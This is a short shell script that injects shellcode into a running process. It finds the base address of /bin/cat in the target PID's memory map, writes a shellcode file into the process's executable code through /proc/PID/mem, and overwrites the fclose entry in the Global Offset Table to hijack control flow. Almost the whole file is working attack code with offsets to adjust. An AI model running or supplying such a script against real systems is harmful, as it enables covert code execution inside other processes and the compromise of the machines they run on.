#!/bin/sh
PID=$1

# Get base address (strip '0x' prefix)
BASE_ADDR=$(grep "/bin/cat" /proc/$PID/map | grep "r-x" | head -1 | awk '{print $1}' | cut -d'-' -f1 | sed 's/^0x//')

# Convert hex to decimal using printf
BASE_DEC=$(printf "%d" "0x$BASE_ADDR")

# Hardcoded offsets (adjust for your binary)
ENTRY_OFFSET=0x18e0 # .text section offset
GOT_OFFSET=0x20d078 # fclose@GOT offset

# Convert offsets to decimal using printf
ENTRY_OFFSET_DEC=$(printf "%d" "$ENTRY_OFFSET")
GOT_OFFSET_DEC=$(printf "%d" "$GOT_OFFSET")

# Calculate final addresses
ENTRY_ADDR=$((BASE_DEC + ENTRY_OFFSET_DEC))
GOT_ADDR=$((BASE_DEC + GOT_OFFSET_DEC))

# Print info
echo "[+] Base: 0x$(printf "%x" $BASE_DEC)"
echo "[+] Shellcode @ 0x$(printf "%x" $ENTRY_ADDR)"
echo "[+] Hijacking GOT @ 0x$(printf "%x" $GOT_ADDR)"

# Inject shellcode
dd if=loader.bin of=/proc/$PID/mem bs=1 seek=$ENTRY_ADDR conv=notrunc 2>/dev/null

# Overwrite GOT entry
dd if=pc.bin of=/proc/$PID/mem bs=1 seek=$GOT_ADDR conv=notrunc 2>/dev/null
